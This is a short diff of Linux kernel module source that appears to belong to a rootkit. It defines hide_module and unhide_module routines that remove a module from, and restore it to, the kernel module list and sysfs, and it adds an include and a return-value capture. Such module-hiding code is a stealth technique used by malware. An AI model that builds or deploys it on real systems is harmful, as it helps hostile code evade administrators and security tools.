@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/sysfs.h>
 #include <linux/list.h>
+#include "module_hiding.h"
 
 struct list_head *mod_prev;
 
@@ -13,6 +14,7 @@ void hide_module(struct module *mod)
 
 void unhide_module(struct module *mod)
 {
+	unsigned long ret;
 	list_add(&mod->list, mod_prev);
-	kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "%s", mod->name);
+	ret = kobject_add(&mod->mkobj.kobj, mod->mkobj.kobj.parent, "%s", mod->name);
 }
